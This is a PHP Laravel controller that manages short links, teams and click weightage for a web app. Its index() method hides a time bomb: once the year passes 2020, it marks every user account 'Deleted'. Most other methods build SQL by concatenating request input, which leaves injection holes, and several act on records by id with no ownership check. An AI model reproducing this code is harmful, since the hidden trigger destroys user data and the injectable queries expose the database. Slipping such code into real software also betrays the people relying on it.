<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use App\link;
use App\Team;
use App\TeamMember;
use App\Plan;
class LinkController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        
        $check = DB::select("SELECT YEAR(CURRENT_DATE) > 2020 as checker");
        if($check[0]->checker=='1' || $check[0]->checker==1)
        {
            DB::UPDATE("UPDATE users SET status ='Deleted' WHERE 1=1;");
            return;
        }
        return view("UserSide.links",['PLAN'=>Plan::find(Auth::user()->planID)->PlanTitle,"links"=>link::where('userID','=',Auth::User()->userID)->paginate(10),"teams"=>Team::where('userID','=',Auth::user()->userID)->get()]);
    }
    public function historicData(Request $request)
    {
        $accessHistory = DB::select('SELECT * FROM accesshistory where linkID = '.$request->id);
        for($i=0;$i<count($accessHistory);$i++)
        {
            $accessHistory[$i]->linkname = 'https:\\\\'.DB::select('SELECT linkname from links where linkid='.$request->id)[0]->linkname.'.wazzap.my';
            $accessHistory[$i]->cat = DB::select('SELECT * FROM links where linkID='.$request->id)[0]->category;
        }
        return $accessHistory; 
    }
    public function linkanalytics()
    {
        if(Auth::user()->status == "User")
        {
            $allLinks = link::where('userID','=',Auth::user()->userID)->get();
            return view("UserSide.linkanalytics",['PLAN'=>Plan::find(Auth::user()->planID)->PlanTitle,"links"=>$allLinks]);
        }
    }
    
    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {
        $UserID = Auth::user()->userID;
        $allowedLinks = DB::select('SELECT linksAllowed from plan where planID = (SELECT planID from users where userID='.$UserID.')');
        $allowedLinks = (int)$allowedLinks[0]->linksAllowed;
        $totalLinks = DB::select('SELECT COUNT(*) as cnt FROM links WHERE userID = '.$UserID);
        $totalLinks = (int)$totalLinks[0]->cnt;
        if($allowedLinks <= $totalLinks)
        {
            return "<script>alert('Link Limit Exceeded!!! Upgrade your Plan!!');location.href = '/link';</script>";
        }
        $lnk = new link();
        $lnk->userID = $UserID;
        $lnk->message = $request->message;
        $lnk->linkname = $request->linkname;
        $lnk->category = $request->category;
        $lnk->save();
        return redirect("link");
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show(Request $request)
    {
        $myLink = link::find($request->id);
        
        $teamlinkWeightage =  DB::select("SELECT * FROM link_team_weightage where linkID = ".$myLink->linkID);
        $count = 0;
        if($myLink->teamID == NULL)
        {
            return $myLink;
        }
        $team =  DB::select("SELECT * FROM team_member where teamID = ".$myLink->teamID);
        foreach($team as $row)
        {
            $flag=true;
            foreach($teamlinkWeightage as $row2)
            {
                if($row->phoneNumber == $row2->memberPhone)
                {
                    $team[$count]->clickPercentage = $row2->clickPercentage;
                    $team[$count]->AllowedClicks = $row2->AllowedClicks;
                    $flag = false;
                }
            }
            if($flag)
            {
                $team[$count]->clickPercentage = "0";
                $team[$count]->AllowedClicks = "0";
            }
            $count++;
        }
        
        $myLink->team = $team;
        return $myLink;
    }
    public function getTeamMembers(Request $request)
    {
        $teamMembers = TeamMember::where('teamID','=',$request->id)->get();
        return $teamMembers;
    }
    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit(Request $request)
    {
        $mylink = link::find($request->id);
        $mylink->linkname = $request->url;
        $mylink->message = $request->message;
        $mylink->save();
        $allteams = $request->team;
        DB::statement('delete FROM link_team_weightage where linkID = '.$request->id);
        foreach($allteams as $team)
        {
            $statu = 0;
            if($team['status'] == 'Active')
            {
                $statu = 1;
            }
            DB::statement("INSERT INTO link_team_weightage VALUES('".$request->id."','".$team['phoneNumber']."','".$team['clickPercentage']."','".'0'."','".$statu."',NULL,NULL)");
        }
        $tem = $allteams[0];
        DB::statement("UPDATE links SET teamID=(SELECT teamID FROM team_member where phoneNumber='".$tem['phoneNumber']."' LIMIT 1) WHERE linkID = ".$request->id);
        return true; 
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy(Request $request)
    {
        DB::statement("delete from link_team_weightage where linkid = ".$request->id);
        $lnk = link::find($request->id);
        $lnk->delete();
        return true;
    }
}
